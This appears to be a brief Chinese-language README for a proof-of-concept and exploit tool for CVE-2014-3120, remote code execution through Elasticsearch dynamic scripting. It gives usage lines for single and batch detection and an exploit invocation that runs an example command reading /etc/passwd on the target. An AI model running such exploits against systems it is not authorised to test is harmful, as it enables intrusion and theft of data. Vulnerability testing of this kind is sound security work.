Elasticsearch 1.2版本及之前的默认配置启用了动态脚本，攻击者可以通过_search的source参数执行任意MVEL表达式和Java代码。需要注意的是，只有在用户没有在独立的虚拟机中运行Elasticsearch时，这才违反了供应商的安全策略。

单个检测：python3 .\CVE-2014-3120-POC.py -t "http://0.0.0.0:1234/"
批量检测：python3 .\CVE-2014-3120-POC.py -f "url.txt"
漏洞利用：./CVE-2014-3120-EXP.* -t URL(http://x.x.x.x/) -c command(cat /etc/passwd) 
